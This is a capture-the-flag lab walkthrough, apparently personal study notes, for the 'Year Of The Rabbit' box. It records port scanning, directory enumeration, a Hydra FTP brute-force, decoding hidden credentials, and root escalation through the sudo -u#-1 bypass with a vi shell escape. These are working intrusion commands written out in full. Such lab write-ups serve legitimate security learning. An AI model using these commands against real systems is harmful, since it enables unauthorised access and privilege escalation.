# Year Of The Rabbit

> Converted from cybersecurity DOCX notes into a structured markdown outline and study reference.

## STEP 1: View the webpage

- Standard Apache2 page

## STEP 2: NMAP SCANNING

- Started two parallele scans

- "nmap -Pn -p- 10.10.148.42"

- "nmap -Pn 10.10.148.42"

- one to get moving and one to be thorough

- response:

```bash
PORT STATE SERVICE
21/tcp open ftp
22/tcp open ssh
80/tcp open http
```

## STEP 3: Attempt anonymous ftp login

- did not work

## Step 4: Deeper NMAP

```bash
nmap -Pn -sV -p 21,22,80 10.10.148.42
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 18:29 EDT
Nmap scan report for 10.10.148.42
Host is up (0.21s latency).
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.2
22/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp open http Apache httpd 2.4.10 ((Debian))
```

## Step 5: Initial Vulnerability Scan

- "nmap -Pn -A -oN vulns.txt 10.10.148.42 --script vuln"

## STEP 6: Directory Scanning

- ""dirb http://10.10.148.42:80 usr/share/wordlists/dirb/common.txt -w"

- found "assets" directly which contained two files: "style.css" and "RickRolled.mp4"

- css file contained the text: "

- Take a look at the page: /sup3r_s3cr3t_fl4g.php"

- jumps to youtube video of Rick Astly "never going to give you up"

- the rickrolled video has a warning inside this is the wrong rabbit hole

## Step 7: Turn off Javascript

- for firefox navigate to "about:config" and search for javascript and switch to disabled

- navigate firefox to http//:10.10.148.42/sup3r_s3cr3t_fl4g.php

- nothing significant. Everything in the browser is the same stuff you could find simply by opening the file to see the text / code in the file

- But, the hint is s till value so try burpsute

## Step 8: Visit the page in BurpSuite

- navigate to: http://10.10.148.42/sup3r_s3cr3t_fl4g.php using the proxy and there is a line in the request

- the line: "GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1"

- visit the url: "http://10.10.148.42/WExYY2Cv-qU/" and find an image called Hot_Babe.png

## Step 9: Inspect the Image

```bash
strings command reveals the username for the ftp: ftpuser
strings command also reveals a whole host of potential passwords
```

- repeated the strings command and output to a pass.txt file

- removed all the text except the passwords

## Step 10: Hydra

- command: hydra -l ftpuser -P pass.txt 10.10.148.42 ftp

- result: "[21][ftp] host: 10.10.148.42 login: ftpuser password: 5iez1wGXKfPKQ"

## Step 11: Log in to ftp

- found a file called: "Ely's_Creds.txt"

- contents are encoded

## Step 12: Figure out the encoding

- new good resource: https://dencode.com/en/

- didn't work for this situation, but could encode and decode all at the same time… not really for analysis

- https://www.dcode.fr/cipher-identifier

- recognized this stuff as "BrainFuck"

- dcode provides:

- User: eli-Password: DSpDiM1wAEwid

## Step 13: Log into SSH

- able to log into ssh with the username and password found in the last step

- login message: "Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

- if we assume "s3cr3t" is a directly we can search for it

- command: "locate s3cr3t"

- 

- eli@year-of-the-rabbit:/home$ locate s3cr3t

/usr/games/s3cr3t

/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!

/var/www/html/sup3r_s3cr3t_fl4g.php

- 

- read the file:

- eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!

Your password is awful, Gwendoline.

It should be at least 60 characters long! Not just MniVCQVhQHUNI

Honestly!

Yours sincerely

- Root

## Step 14: Get the User.txt flag

- switch user: "su gwendoline"

- use her password

## Step 15 Linux privilege escalation

- run: "sudo -l" and get:

- User gwendoline may run the following commands on year-of-the-rabbit:

- (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

- this indicates "vi" is vulnerable and since gwendoline can edit the user.txt file, we can combine these to for privilege escalation

- GTFOBINS: https://gtfobins.github.io/gtfobins/vi/

## Step 16: Edit the user.txt file with VI

- use the command: "sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt"

- the #u-1 is not on the gtfobins website but it tells the sudo command to bypass it's request for credentials which works because the user already has sudo permissions (I think)

- that command opens the user.txt file into edit mode

- enter command: ":!/bin/bash" and press enter to gain root privileges
